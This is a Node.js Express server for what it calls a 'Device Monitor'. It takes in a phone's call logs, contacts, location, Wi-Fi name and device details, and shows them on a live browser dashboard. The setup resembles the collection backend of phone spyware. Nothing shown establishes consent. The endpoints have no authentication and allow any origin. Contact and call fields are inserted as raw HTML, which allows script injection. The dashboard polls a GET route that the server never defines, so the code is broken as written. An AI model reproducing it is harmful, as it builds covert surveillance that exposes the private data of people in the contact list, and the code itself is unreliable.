const express = require('express');
const cors = require('cors');
const app = express();

// Middleware
app.use(express.json({ limit: '10mb' }));
app.use(cors());

// In-memory storage for the latest data
let latestData = {
    status: "Waiting for device to connect...",
    device: { model: "—", os: "—" },
    battery: 0,
    online: false,
    wifi: "—",
    location: { lat: 0, lng: 0 },
    calls: [],
    contacts: []
};

// ---------------------------------------------------------
// 1. ENDPOINT FOR THE PHONE TO SEND DATA
// ---------------------------------------------------------
app.post('/api/report', (req, res) => {
    console.log(`📥 Data received at ${new Date().toLocaleTimeString()}`);
    latestData = { ...req.body, lastUpdated: new Date().toLocaleTimeString() };
    res.json({ success: true, message: "Data received" });
});

// ---------------------------------------------------------
// 2. ENDPOINT FOR THE LAPTOP DASHBOARD
// ---------------------------------------------------------
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Device Monitor Dashboard</title>
        <script src="https://cdn.tailwindcss.com"></script>
        <style>
            body { font-family: 'Inter', system-ui, sans-serif; background-color: #0f172a; color: #e2e8f0; }
            .custom-scrollbar::-webkit-scrollbar { width: 6px; }
            .custom-scrollbar::-webkit-scrollbar-track { background: #1e293b; }
            .custom-scrollbar::-webkit-scrollbar-thumb { background: #475569; border-radius: 4px; }
        </style>
    </head>
    <body class="min-h-screen p-6">
        <div class="max-w-6xl mx-auto">
            
            <!-- Header -->
            <div class="flex items-center justify-between mb-8">
                <div>
                    <h1 class="text-3xl font-bold text-white tracking-tight">Device Monitor</h1>
                    <p class="text-sm text-slate-400 mt-1" id="last-update">Waiting for data...</p>
                </div>
                <div class="flex items-center gap-2 px-4 py-2 bg-slate-800 rounded-full border border-slate-700 shadow-sm">
                    <span class="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" id="status-dot"></span>
                    <span class="text-sm font-medium text-slate-200" id="status-text">Connecting</span>
                </div>
            </div>

            <!-- Top Stats Grid -->
            <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
                <!-- Battery -->
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="absolute top-0 right-0 p-3 opacity-10">
                        <svg class="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M16 4h-2V2H10v2H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h8c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 16H8V6h8v14z"/></svg>
                    </div>
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Battery</div>
                    <div class="text-3xl font-bold text-white" id="battery">--%</div>
                </div>

                <!-- Network -->
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="absolute top-0 right-0 p-3 opacity-10">
                        <svg class="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/></svg>
                    </div>
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Network</div>
                    <div class="text-2xl font-bold text-white" id="network">--</div>
                </div>

                <!-- Wi-Fi -->
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="absolute top-0 right-0 p-3 opacity-10">
                        <svg class="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M1 9l2 2c4.97-4.97 13.03-4.97 18 0l2-2C16.93 2.93 7.08 2.93 1 9zm8 8l3 3 3-3c-1.65-1.66-4.34-1.66-6 0zm-4-4l2 2c2.76-2.76 7.24-2.76 10 0l2-2C15.14 9.14 8.87 9.14 5 13z"/></svg>
                    </div>
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Wi-Fi SSID</div>
                    <div class="text-lg font-bold text-white truncate pr-8" id="wifi">--</div>
                </div>

                <!-- Device -->
                <div class="bg-slate-800 p-5 rounded-2xl border border-slate-700 shadow-lg relative overflow-hidden">
                    <div class="absolute top-0 right-0 p-3 opacity-10">
                        <svg class="w-12 h-12 text-white" fill="currentColor" viewBox="0 0 24 24"><path d="M17 1.01L7 1c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-1.99-2-1.99zM17 19H7V5h10v14z"/></svg>
                    </div>
                    <div class="text-xs font-semibold text-slate-400 uppercase tracking-wider mb-1">Device</div>
                    <div class="text-lg font-bold text-white truncate pr-8" id="model">--</div>
                    <div class="text-xs text-slate-400" id="os">--</div>
                </div>
            </div>

            <!-- Data Lists -->
            <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                
                <!-- Call Logs -->
                <div class="bg-slate-800 rounded-2xl border border-slate-700 shadow-lg overflow-hidden flex flex-col h-[500px]">
                    <div class="p-5 border-b border-slate-700 bg-slate-800/50">
                        <h2 class="text-lg font-bold text-white flex items-center gap-2">
                            <svg class="w-5 h-5 text-blue-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                            Recent Calls
                        </h2>
                    </div>
                    <div class="flex-1 overflow-y-auto p-2 custom-scrollbar" id="call-list">
                        <div class="text-center text-slate-500 mt-10">Waiting for call logs...</div>
                    </div>
                </div>

                <!-- Contacts -->
                <div class="bg-slate-800 rounded-2xl border border-slate-700 shadow-lg overflow-hidden flex flex-col h-[500px]">
                    <div class="p-5 border-b border-slate-700 bg-slate-800/50">
                        <h2 class="text-lg font-bold text-white flex items-center gap-2">
                            <svg class="w-5 h-5 text-emerald-400" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M17 20h5v-2a3 3 0 00-5.356-1.857M17 20H7m10 0v-2c0-.656-.126-1.283-.356-1.857M7 20H2v-2a3 3 0 015.356-1.857M7 20v-2c0-.656.126-1.283.356-1.857m0 0a5.002 5.002 0 019.288 0M15 7a3 3 0 11-6 0 3 3 0 016 0zm6 3a2 2 0 11-4 0 2 2 0 014 0zM7 10a2 2 0 11-4 0 2 2 0 014 0z"></path></svg>
                            Contacts
                        </h2>
                    </div>
                    <div class="flex-1 overflow-y-auto p-2 custom-scrollbar" id="contact-list">
                        <div class="text-center text-slate-500 mt-10">Waiting for contacts...</div>
                    </div>
                </div>

            </div>
        </div>

        <script>
            async function fetchData() {
                try {
                    const res = await fetch('/api/report');
                    const data = await res.json();
                    
                    if (!data.lastUpdated) return; // No data yet

                    // Update Status
                    document.getElementById('last-update').innerText = "Last sync: " + data.lastUpdated;
                    document.getElementById('status-dot').className = "w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse";
                    document.getElementById('status-text').innerText = "Online";

                    // Update Top Stats
                    document.getElementById('battery').innerText = (data.battery || 0) + "%";
                    document.getElementById('network').innerText = data.online ? "🟢 Connected" : "🔴 Offline";
                    document.getElementById('wifi').innerText = data.wifi || "Not connected";
                    document.getElementById('model').innerText = data.device?.model || "Unknown";
                    document.getElementById('os').innerText = data.device?.os || "Unknown";

                    // Render Calls
                    const callList = document.getElementById('call-list');
                    if (data.calls && data.calls.length > 0) {
                        callList.innerHTML = '';
                        data.calls.forEach(call => {
                            let iconColor = "text-slate-400";
                            if (call.type === 'Incoming') iconColor = "text-emerald-400";
                            if (call.type === 'Outgoing') iconColor = "text-blue-400";
                            if (call.type === 'Missed') iconColor = "text-red-400";

                            callList.innerHTML += \`
                                <div class="flex items-center justify-between p-3 mb-1 bg-slate-700/30 rounded-xl hover:bg-slate-700/60 transition">
                                    <div class="flex items-center gap-3">
                                        <div class="p-2 rounded-full bg-slate-800 \${iconColor}">
                                            <svg class="w-4 h-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M3 5a2 2 0 012-2h3.28a1 1 0 01.948.684l1.498 4.493a1 1 0 01-.502 1.21l-2.257 1.13a11.042 11.042 0 005.516 5.516l1.13-2.257a1 1 0 011.21-.502l4.493 1.498a1 1 0 01.684.949V19a2 2 0 01-2 2h-1C9.716 21 3 14.284 3 6V5z"></path></svg>
                                        </div>
                                        <div>
                                            <div class="font-semibold text-slate-200">\${call.number}</div>
                                            <div class="text-xs \${iconColor}">\${call.type}</div>
                                        </div>
                                    </div>
                                    <div class="text-xs font-mono text-slate-400">\${call.duration}s</div>
                                </div>
                            \`;
                        });
                    }

                    // Render Contacts
                    const contactList = document.getElementById('contact-list');
                    if (data.contacts && data.contacts.length > 0) {
                        contactList.innerHTML = '';
                        data.contacts.forEach(contact => {
                            contactList.innerHTML += \`
                                <div class="flex items-center justify-between p-3 mb-1 bg-slate-700/30 rounded-xl hover:bg-slate-700/60 transition">
                                    <div class="flex items-center gap-3">
                                        <div class="w-8 h-8 rounded-full bg-gradient-to-br from-indigo-500 to-purple-600 flex items-center justify-center text-white font-bold text-xs">
                                            \${contact.name.charAt(0).toUpperCase()}
                                        </div>
                                        <div class="font-semibold text-slate-200">\${contact.name}</div>
                                    </div>
                                    <div class="text-xs font-mono text-slate-400">\${contact.number}</div>
                                </div>
                            \`;
                        });
                    }

                } catch (e) {
                    console.error("Failed to fetch data", e);
                }
            }
            
            // Fetch immediately, then every 3 seconds
            fetchData();
            setInterval(fetchData, 3000);
        </script>
    </body>
    </html>
    `);
});

// ---------------------------------------------------------
// 3. START THE SERVER (Render Compatible)
// ---------------------------------------------------------
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Dashboard running on port ${PORT}`);
    console.log(`👉 Waiting for data from your phone...`);
});